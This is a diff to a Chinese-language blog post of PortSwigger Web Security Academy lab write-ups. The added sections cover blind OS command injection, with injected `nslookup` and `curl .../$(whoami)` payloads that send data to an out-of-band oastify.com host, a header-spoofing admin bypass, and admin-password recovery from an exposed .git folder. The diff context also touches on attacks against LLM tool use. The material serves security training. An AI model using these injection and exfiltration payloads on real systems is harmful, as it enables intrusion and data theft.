@@ -165,6 +165,10 @@ export default function Post() {
             <X.H2>Pr: Blind OS command injection with output redirection</X.H2>
             <X.P>题目提示目录`/var/www/images`用于存储静态图片，可以利用这点在服务端没有回显的情况下，读取注入命令的输出。</X.P>
             <X.P>和上一题非常类似，只需要把`email`参数改为{'`;whoami > /var/www/images/1.txt;`'}，然后访问`/image?filename=1.txt`。</X.P>
+            <X.H2>Pr: Blind OS command injection with out-of-band interaction</X.H2>
+            <X.P>题目只需对带外服务器发起一个DNS查询，`email`参数改为{'`;nslookup t82fv9ixj1eo77w280l694ldu40xoocd.oastify.com;`'}。</X.P>
+            <X.H2>Pr: Blind OS command injection with out-of-band data exfiltration</X.H2>
+            <X.P>需要得到当前登录用户的用户名，`email`参数改为{'`;curl hpa3cxzl0pvcovdqpo2uqs21bshm5et3.oastify.com/$(whoami);`'}，可以在Collaborator HTTP请求记录中看到`GET /peter-BPPYsm HTTP/1.1`。</X.P>
             <X.H1>Path traversal</X.H1>
             <X.H2>Ap: File path traversal, simple case</X.H2>
             <X.P>随便检查一个图片，地址为`/image?filename=23.jpg`，改为`/txt?filename=../../../etc/passwd`即可。</X.P>
@@ -237,11 +241,47 @@ export default function Post() {
             <X.P>根据提示扫目录发现`/cgi-bin`，然后在`/cgi-bin/phpinfo.php`中找到`SECRET_KEY`为`wmxjxsr1m446564ya43mb4f1vvueyvfo`。</X.P>
             <X.H2>Ap: Source code disclosure via backup files</X.H2>
             <X.P>扫目录发现`/backup`，找到源代码文件，发现写在源码里的数据库密码`muwgq3v6l0w2jhuw8cbrya9lmcbs4bx9`。</X.P>
+            <X.H2>Ap: Authentication bypass via information disclosure</X.H2>
+            <X.P>直接请求`/admin`，显示需要本地用户才能访问。使用`TRACE`方法请求`/admin`，发现请求头被添加了`X-Custom-IP-Authorization`，服务端用此字段判断是否为本地用户，改为`127.0.0.1`可以登录管理员界面。具体操作可见@官方题解[https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass]@。</X.P>
+            <X.H2>Pr: Information disclosure in version control history</X.H2>
+            <X.P>使用`wget -r`下载网页的`/.git`文件夹，`git log`查看日志：</X.P>
+            <X.CodeBlock
+                language="text"
+                code={`
+                commit 57d75a9b828905169416fe118cabe361f3fc04ad (HEAD -> master)
+                Author: Carlos Montoya <carlos@carlos-montoya.net>
+                Date:   Tue Jun 23 14:05:07 2020 +0000
+
+                    Remove admin password from config
+
+                commit 501316ec0dc033da3b9e795215e85dd28cf59c9d
+                Author: Carlos Montoya <carlos@carlos-montoya.net>
+                Date:   Mon Jun 22 16:23:42 2020 +0000
+
+                    Add skeleton admin panel
+                `}
+            />
+            <X.P>然后`git diff 501316 57d75a`查看提交记录：</X.P>
+            <X.CodeBlock
+                language="text"
+                diffRemovedLines="6"
+                diffAddedLines="7"
+                code={`
+                diff --git a/admin.conf b/admin.conf
+                index 71c5e04..21d23f1 100644
+                --- a/admin.conf
+                +++ b/admin.conf
+                @@ -1 +1 @@
+                -ADMIN_PASSWORD=dtncjuzxirlmrnxba4l9
+                +ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+                `}
+            />
+            <X.P>可以拿到管理员密码。</X.P>
             <X.H1>Web LLM attacks</X.H1>
             <X.H2>Ap: Exploiting LLM APIs with excessive agency</X.H2>
             <X.P>题目给了AI聊天功能，还能查看后端日志，聊了几句后看日志发现有大模型工具调用：</X.P>
             <X.CodeBlock
-                language="text"
+                language="json"
                 code={`
                 {
                     "role": "assistant",
